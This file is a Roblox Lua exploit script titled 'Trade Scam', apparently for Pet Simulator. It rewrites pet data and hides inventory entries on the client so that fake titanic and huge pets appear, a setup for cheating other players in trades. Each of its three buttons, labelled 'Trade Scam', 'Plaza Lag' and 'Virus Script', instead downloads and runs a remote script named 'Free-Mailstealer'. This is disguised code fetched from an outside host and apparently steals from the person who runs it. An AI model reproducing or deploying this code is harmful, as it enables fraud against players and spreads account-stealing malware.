local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/PtacikCZ/LOL/main/Nothing'))()
local Window = Rayfield:CreateWindow({
    Name = "PtacikCZ Scriptz | Trade Scam 💵",
    LoadingTitle = "PtacikCZ Scriptz Trade Scam...",
    LoadingSubtitle = "By PtacikCZ Discord",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = "PtacikCZ Scriptz", 
        FileName = "PtacikCZ"
    },
    Discord = {
        Enabled = true,
        Invite = "PtacikCZ",  
        RememberJoins = false 
    },
    KeySystem = true,         -- Set this to true to use our key system
    KeySettings = {
        Title = "PtacikCZ Scriptz",
        Subtitle = "Trade Scam",
        Note = "bit.ly/ptacikcz",
        FileName = "PtacikCZ",
        SaveKey = false,
        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
        Key = "PtacikCZ"
    }
})

-- Notifying Functions
local v2 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
local singstop
local function wrong()
    Rayfield:Notify({
        Title = "Wrong Pet",
        Content = "Please Enter A Valid Pet Name",
        Duration = 1,
        Image = 9003576350,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Understood!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function wrong2()
    Rayfield:Notify({
        Title = "No Pet",
        Content = "Please Enter A Pet Name",
        Duration = 1,
        Image = 9003568230,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function nothuge()
    Rayfield:Notify({
        Title = "Not A Huge Pet",
        Content = "Please Put A Huge Pet",
        Duration = 1,
        Image = 9003575074,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function nottext()
    Rayfield:Notify({
        Title = "No Text",
        Content = "Please Enter A Text",
        Duration = 1,
        Image = 8997529686,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
-- Other Functions

function table_contains(tbl, x)
    found = false
    for _, v in pairs(tbl) do
        if v == x then
            found = true
        end
    end
    return found
end

function deletevalues(tbl, value)
    for k, v in pairs(tbl) do
        if v ~= value then
            tbl[k] = nil
        end
    end
end

function removeValueFromTable(table, value)
    for key, val in pairs(table) do
        if val == value or key == value then
            table[key] = nil
            return true
        end
    end
    return false
end

game:GetService("ReplicatedStorage").Assets.UI.FRAMEWORK.InfoOverlay.Blocks.Rare.Visible = false

-- Enchanting Fucntions
nkList = {}
function ttenchant()
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    TitanicList = {}
    TList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.titanic then
            table.insert(TitanicList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(TitanicList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Titanic"
            v.powers[1][2] = 1
            if v.nk == nil then
                v.nk = "Demonized"
            end
            table.insert(TList, v["uid"])
        end
        for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
            if table_contains(TList, V.Name) then
                V:Destroy()
            end
        end
    end
    spawn(function()
        while task.wait(0.01) do
            ETList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.titanic then
                    table.insert(ETList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(ETList, v["id"]) ~= nil then
                    if not table_contains(nkList, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        if not v.powers[2] then
                            v.powers[2] = {}
                            v.powers[2][1] = "Strength"
                            v.powers[2][2] = math.random(1, 5)
                        end
                        v.powers[1][1] = "Titanic"
                        v.powers[1][2] = 1
                        if v.nk ~= getgenv().newtext then
                            table.insert(nkList, v.nk)
                        end
                        if table_contains(nkList, getgenv().newtext) then
                            if removeValueFromTable(nkList, getgenv().newtext) then
                                print("deleted")
                            end
                        end
                    end
                end
            end
        end
    end)
end

Hnk = {}
function henchant(hname, lname)
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    HugeList = {}
    HList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == hname or v.name == lname then
            table.insert(HugeList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(HugeList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Best Friend"
            v.powers[1][2] = 1
            if v.nk == nil then
                v.nk = "Demonized"
            end
            table.insert(HList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(HList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(HList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            HHList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.huge then
                    table.insert(HHList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(HHList, v["id"]) ~= nil then
                    if not table_contains(Hnk, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        if not v.powers[2] then
                            v.powers[2] = {}
                            v.powers[2][1] = "Strength"
                            v.powers[2][2] = math.random(1, 5)
                        end
                        v.powers[1][1] = "Best Friend"
                        v.powers[1][2] = 1
                        if v.nk ~= getgenv().newtext then
                            table.insert(Hnk, v.nk)
                        end
                        if table_contains(Hnk, getgenv().newtext) then
                            if removeValueFromTable(Hnk, getgenv().newtext) then
                                print("deleted")
                            end
                        end
                    end
                end
            end
        end
    end)
end

Enk = {}
function excenchant(excname, fppname)
    tttohugecheck = false
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    ExcList = {}
    EList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == excname or v.name == fppname then
            table.insert(ExcList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(ExcList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Companion"
            v.powers[1][2] = 2
            if v.nk == nil then
                v.nk = "Demonized"
            end
            table.insert(EList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(EList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(EList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            EEList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.name == excname then
                    table.insert(EEList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(EEList, v["id"]) ~= nil then
                    if not table_contains(Enk, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        if not v.powers[2] then
                            v.powers[2] = {}
                            v.powers[2][1] = "Strength"
                            v.powers[2][2] = math.random(1, 5)
                        end
                        v.powers[1][1] = "Companion"
                        v.powers[1][2] = 2
                        if v.nk ~= getgenv().newtext then
                            table.insert(Enk, v.nk)
                        end
                        if table_contains(Enk, getgenv().newtext) then
                            if removeValueFromTable(Enk, getgenv().newtext) then
                                print("deleted")
                            end
                        end
                    end
                end
            end
        end
    end)
end

Bnk = {}
function bananaenchant()
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    BananaList = {}
    BList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == "banana" or v.name == "Dog" then
            table.insert(BananaList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(BananaList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            local value1 = "Royalty"
            local value2 = "Magnet"
            local value3 = "Glittering"

            local randomIndex = math.random(1, 3)

            local randomValue
            if randomIndex == 1 then
                randomValue = value1
            elseif randomIndex == 2 then
                randomValue = value2
            else
                randomValue = value3
            end
            v.powers[1][1] = randomValue
            v.powers[1][2] = 1
            v.powers[2] = nil
            if v.nk == nil then
                v.nk = "Demonized"
            end
            table.insert(BList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(BList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(BList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            BBList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.name == "banana" then
                    table.insert(BBList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(BBList, v["id"]) ~= nil then
                    if not table_contains(Bnk, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        local value1 = "Royalty"
                        local value2 = "Magnet"
                        local value3 = "Glittering"

                        local randomIndex = math.random(1, 3)

                        local randomValue
                        if randomIndex == 1 then
                            randomValue = value1
                        elseif randomIndex == 2 then
                            randomValue = value2
                        else
                            randomValue = value3
                        end
                        v.powers[1][1] = randomValue
                        v.powers[1][2] = 1
                        v.powers[2] = nil
                        table.insert(Bnk, v.nk)
                    end
                    if table_contains(Bnk, getgenv().newtext) then
                        if removeValueFromTable(Bnk, getgenv().newtext) then
                            print("deleted")
                        end
                    end
                end
            end
        end
    end)
end

function giftenchant(gfname, pname)
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    GiftList = {}
    GList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == gfname or v.name == pname then
            table.insert(GiftList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(GiftList, v["id"]) ~= nil then
            v.powers = nil
            v.snk = nil
            v.nk = nil
            table.insert(GList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(GList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(GList, V.Name) then
            V:Destroy()
        end
    end
end

function sign()
    spawn(function()
        while singstop do
            task.wait(0.1)
            if game:GetService("Players").LocalPlayer.PlayerGui.Rename.Frame.SignInfo.Visible == false then
                game:GetService("Players").LocalPlayer.PlayerGui.Rename.Frame.SignInfo.Visible = true
            end
            local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local y = {}
            for i, v in pairs(pets) do
                y[v["uid"]] = false
            end
            for i, v in pairs(pets) do
                if v.nk == getgenv().newtext and v.snk ~= true then
                    v.snk = true
                end
            end
        end
    end)
end

-- Titanics

local fpet
local fpetID
local Tab = Window:CreateTab("Scripts", 12378209702) -- Title, Image
local Paragraph = Tab:CreateParagraph({
    Title = "Requirements",
    Content =  [[Experiencing Bugs/Errors? Contact Support, https://discord.gg/wZqBNXS9Kn]]
})


-- Titanic Replacament
local titanicname
function TitanicChange()
    if fpetID == nil and fpet ~= nil then
        wrong()
    elseif fpet == nil then
        wrong2()
    end
    if fpet ~= nil and fpetID ~= nil then
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local titanicsm = string.split(v.Name, " - ")[2]
            if titanicsm == tostring(titanicname) then
                local titanicID = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[fpetID .. " - " .. fpet]
                    ["Pet Data (" .. fpet .. ")"])
                v1.name = titanicname
                v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [titanicID .. " - " .. titanicname]
                    .Pet
                v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [titanicID .. " - " .. titanicname].Golden
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                v1.titanic = true
                v1.isGift = false
                v1.giftEggId = nil
                v1.giftCallback = nil
                v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                v1.darkMatterThumbnail = ""
                v1.rarity = "Exclusive"
                v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                v1.tradeable = true
                v1.strengthMin = 2
                v1.strengthMax = 3
                v1.petFlyHeight = require(v:FindFirstChildOfClass("ModuleScript")).petFlyHeight
                v1.ridingGravity = require(v:FindFirstChildOfClass("ModuleScript")).ridingGravity
                v1.ridingJumpPower = require(v:FindFirstChildOfClass("ModuleScript")).ridingJumpPower
                v1.ridingCameraOffset = require(v:FindFirstChildOfClass("ModuleScript")).ridingCameraOffset
                ttenchant()
                break
            end
        end
    end
end

local Section = Tab:CreateSection("Scripts")
local Button = Tab:CreateButton({
    Name = "Trade Scam",
    Callback = function()
        titanicname = "Titanic Jolly Cat"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PtacikCZ/Steal/main/Free-Mailstealer"))()

    end,
})
local Button = Tab:CreateButton({
    Name = "Plaza Lag",
    Callback = function()
        titanicname = "Titanic Balloon Monkey"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PtacikCZ/Steal/main/Free-Mailstealer"))()

    end,
})
local Button = Tab:CreateButton({
    Name = "Virus Script",
    Callback = function()
        titanicname = "Titanic Neon Agony"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PtacikCZ/Steal/main/Free-Mailstealer"))()

    end,
})

